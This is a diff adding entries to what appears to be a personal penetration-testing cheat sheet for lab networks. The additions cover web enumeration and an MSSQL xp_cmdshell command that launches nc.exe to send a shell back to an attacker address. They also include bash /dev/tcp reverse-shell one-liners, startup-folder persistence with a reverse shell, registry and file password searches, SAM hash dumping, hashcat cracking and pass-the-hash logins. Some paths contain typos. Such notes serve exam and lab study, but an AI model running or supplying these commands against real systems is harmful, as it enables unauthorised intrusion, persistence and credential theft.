@@ -51,17 +51,35 @@ for vul in $(find / -name smb*vuln*.nse | cut -d"/" -f 6); do nmap -v -p 139,445
 ```
 ### Web Enumeration
 ```
+nmap -A -p80 --open 10.11.1.0/24 -oG nmap-scan_10.11.1.1-254
+
+cat nmap-scan_10.11.1.1-254
+
+cat nmap-scan_10.11.1.1-254 | grep 80
+
+cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap"
+
+cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'
+
+for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done ![image](https://user-images.githubusercontent.com/32726832/168017683-f53aedfb-8f65-4d11-86f1-e937c76de13a.png)
+
+nmap --script http-enum.nse 10.11.1.133
+nikto -h http://10.11.1.133
+gobuster dir http://10.11.1.133 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+
 ```
 ### Network Enumeration
 ```
 ```
 ### Gaining Access/Exploitation
 ```
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="c:\\Users\Public\\nc.exe -e cmd.exe 192.168.119.x 4444" 10.11.1.x
+
 ```
 ### Creating Reverse Shells
 https://www.revshells.com/
 ```
-sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
+sh -i >& /dev/tcp/10.11.1.10/9001 0>&1
 0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196
 exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done
 sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5
@@ -91,9 +109,71 @@ export PATH=$PATH:/usr/bin
 ```
 ### Post-Exploitation/Situational Awareness
 ```
+Each user can define apps that start whem they first log in, by placing shortcuts to them in a specific directory
+Windows also has a startup directory for apps that should start for all users:
+	• C:\ProgramData\Microsoft\Windows\Stat Menu\Programs\StatUp
+	• If we can create files in this directory we can use our reverse shell executable & escalate privs when an admin logs in
+
+Example, put the reverse shell in the above directory or startup directory for admin
+	• Listen for reverse shell on kali
+	• Receive reverse shell
+
+Use accesschk to see what users have write access
+	• .\acesschk.exe /accepteula -d "C:\ProgramData\Microst\Windows\Start Menu\Programs\StartUp"
+	• Files placed here must be shortcuts aka .LNK files 
+	• The file below creates a shortcut using virtual basic script which sets the path to the reverse shell
+	• 
+	• To run it "cscript CreateShortcut.vbs"
+	• Next run the listener
+	• When the admin logs in again, it will execute the file set in the oLink.TargetPath
+![image](https://user-images.githubusercontent.com/32726832/168018223-767f64d1-d3b8-4604-8949-e14c3f34798d.png)
+
 ```
 ### Windows PrivEsc
+
+### Looking for Passwords
 ```
+	• Several features of windows store password insecurely
+	• Programs can store them in the registry
+		○ Reg query HKLM /f password /t REG_SZ /s
+		○ Reg query HKCU /f password /t REG_SZ /s
+	• Autologon & putty saved sessions may be found
+	• Winexe can be used to spawn a shell from kali machine
+		○ Winexe -U 'admin%password' //ip cmd.exe
+		○ Winexe -U 'admin%password' --system //ip cmd.exe
+	• The following query may find passwords in the key name or the key value 
+		○ Reg query HKLM /f password /t REG_SZ /S
+
+	• Find saved creds with winpeas
+		○ .\winPEASany.exe quiet cmd windowscreds
+		○ Cmdkey /list
+	• Send reverse shell with saved creds
+		○ Runas /savecred /user:admin C:\PriveEsc\reverse.exe
+	• Configuration files
+		○ Unattend.xml
+	• Recursively search for files in current directory with pass in name or end with the .config extension
+		○ Dir /s *pass& == *.config
+	• Recursively search for files in the current directory with password that also in with multiple extensions
+		○ Findstr /si password &.xml *.ini *.txt
+	
+	• Looks for known files that may contain password information
+		○ .\winPEASany.exe quiet cmd searchfast filesinfo
+	• Windows stores password hashes in the Security Account Manager (SAM)
+	• Hashes are encrypted with a key which can be found in a file named SYSTEM
+	• Read access to the SAM & SYSTEM files can also allow you to extract the hashes
+	• Pwdump needs to be the latest version to extract hashes from windows 10 
+		○ Git clone https://github.com/Neohapsis/creddump7.git
+		○ Python2 pwdump.py /tools/SYSTEM /tool/SAM
+	• Crack hash for windows 10 passwords NTLM
+		○ Hashcat -m 1000 --force hash /usr/share/wordlists/rockyou.txt
+	• Windows Accepts hashes instead of passwords to authenticate to a number of services, this is known as pass the hash. Tools that can be used are:
+		○ Winexe
+		○ Pth-winexe 
+	• Logon with admin user without cracking password, include entire hash
+		○ Pth-winexe -U 'admin%alksjdflkjasdlfjlsadfj:aksjdlkfjalksdjflkadjs; //ip cmd.exe
+		○ Pth-winexe --system -U 'admin%alksjdflkjasdlfjlsadfj:aksjdlkfjalksdjflkadjs; //ip cmd.exe
+		
+![image](https://user-images.githubusercontent.com/32726832/168018025-b107690c-9422-4832-accd-5865a23c89d4.png)
 ```
 ### Linux PrivEsc
 ```
